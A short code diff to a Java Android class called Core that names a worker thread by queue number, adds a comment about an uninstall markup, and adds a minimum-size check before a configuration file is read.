@@ -244,6 +244,7 @@ public class Core extends Activity implements Runnable {
 		private final int queue;
 
 		CheckAction(int queue) {
+			Thread.currentThread().setName("queue_" + queue);
 			this.queue = queue;
 		}
 
@@ -360,6 +361,7 @@ public class Core extends Activity implements Runnable {
 		try {
 			Path.makeDirs();
 
+			// this markup is created by UninstallAction
 			final Markup markup = new Markup(0);
 			if (markup.isMarkup()) {
 				UninstallAction.actualExecute();
@@ -569,6 +571,10 @@ public class Core extends Activity implements Runnable {
 				Check.log(TAG + " (loadConfFile): " + file);
 			}
 
+			if(file.getSize()<8){
+				return false;
+			}
+			
 			final byte[] resource = file.read(8);
 			// Initialize the configuration object
 			Configuration conf = new Configuration(resource);
